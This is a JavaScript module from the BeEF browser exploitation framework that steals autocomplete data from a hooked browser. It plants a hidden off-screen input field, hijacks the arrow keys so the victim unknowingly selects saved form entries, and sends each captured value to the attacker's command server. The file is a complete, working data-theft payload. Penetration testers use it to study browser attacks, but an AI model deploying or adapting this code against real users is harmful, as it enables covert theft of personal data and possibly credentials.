//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	steal_autocomplete = function() {

		var results = [];

		// hijack keys and set focus
		get_autocomplete = function (){
			window.addEventListener("keydown",function(e){
				switch(e.keyCode) {
					case 37: // left
						scrollTo(window.pageXOffset-20, window.pageYOffset);
					break;
					case 38: // up
						scrollTo(window.pageXOffset, window.pageYOffset-20);
					break;
					case 39: // right
						scrollTo(window.pageXOffset+20, window.pageYOffset);
					break;
					case 40: // down
						scrollTo(window.pageXOffset, window.pageYOffset+20);
					break;
					default:break;
				}
			},false);
			document.getElementById("placeholder").focus();
			
		}

		inArray = function(el, arr){
			for (var i = 0;i < arr.length;i++)
				if (el===arr[i])
					return true;   
			return false;
		}

		steal = function(n,v) {
			var val = JSON.stringify({'input':n,'value':v});
			if (v != "" && !inArray(val,results)){
				results.push(val);
				beef.debug("[Module - autocomplete_theft] Found saved string: '" + val + "'");
				beef.net.send('<%= @command_url %>', <%= @command_id %>, "results="+val);
			}
		}

		tt = function(ev) {
			if (ev.keyCode == 37 || ev.keyCode == 39) setTimeout(function(){ ev.target.blur(); },100);
		}

		// create hidden input element
		input = document.createElement('input');
		input.setAttribute("id",    "placeholder");
		input.setAttribute("name",  "<%= @input_name %>");
		input.setAttribute("style", "position:relative;top:-1000px;left:-1111px;width:1px;height:1px;border:none;");
		input.setAttribute("type",  "text");
		input.onkeyup   = function(event) { tt(event); }
		input.onkeydown = function(event) { tt(event); }
		input.onblur    = function(event) { steal(this.name,this.value);var o=this;setTimeout(function(){ o.focus();},100);this.value = "";document.body.removeChild(this); }
		document.body.appendChild(input);

		// steal autocomplete
		get_autocomplete();

	}

	setTimeout("steal_autocomplete();", 100);

});

